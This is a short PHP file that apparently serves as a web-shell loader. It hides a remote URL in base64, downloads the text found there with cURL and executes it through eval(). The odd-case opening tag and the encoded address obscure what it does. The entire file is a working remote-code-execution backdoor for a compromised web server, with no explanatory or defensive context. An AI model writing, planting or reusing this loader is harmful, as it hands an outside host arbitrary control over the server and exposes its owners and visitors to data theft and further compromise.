<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
$x= '?>';
      eval($x . get(base64_decode('aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9zYXNrcmEudHh0')));
?>
